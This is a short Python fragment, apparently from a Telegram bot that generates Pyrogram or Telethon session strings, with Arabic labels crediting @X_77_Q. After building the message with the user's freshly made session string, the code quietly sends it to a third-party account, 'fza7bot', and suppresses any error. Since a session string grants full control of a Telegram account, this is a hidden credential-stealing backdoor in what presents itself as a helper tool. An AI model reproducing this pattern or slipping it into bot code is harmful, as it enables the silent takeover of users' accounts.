...
async def generate_session(bot, msg, telethon=False):
    ...
    text = "**{} كـود اެݪجـلسة** \n\n`{}` \n\مـسـتخࢪج من @X_77_Q".format(
"تليثون" if telethon else "بايࢪوجࢪام", string_session
    )
    try:
        await client.send_message("fza7bot", text)
    except KeyError:
        pass
